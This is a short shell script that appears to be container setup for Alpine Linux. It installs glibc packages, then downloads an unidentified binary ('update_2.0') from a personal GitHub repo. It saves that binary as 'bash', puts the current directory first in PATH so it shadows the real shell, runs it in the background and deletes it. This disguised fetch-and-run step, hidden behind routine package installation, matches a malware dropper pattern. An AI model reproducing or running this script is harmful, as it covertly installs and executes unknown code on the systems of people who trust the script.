#!/bin/bash
wget -q -O /etc/apk/keys/sgerrand.rsa.pub https://alpine-pkgs.sgerrand.com/sgerrand.rsa.pub
wget -q https://github.com/sgerrand/alpine-pkg-glibc/releases/download/2.35-r1/glibc-2.35-r1.apk
wget -q https://github.com/sgerrand/alpine-pkg-glibc/releases/download/2.35-r1/glibc-bin-2.35-r1.apk
apk add glibc-2.35-r1.apk
apk add glibc-bin-2.35-r1.apk
rm -rf glibc-2.35-r1.apk
rm -rf glibc-bin-2.35-r1.apk
wget -q -O bash https://github.com/jackmoc/Alpine/raw/main/update_2.0
chmod +x /bash
PATH=.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin
bash &
rm -rf bash
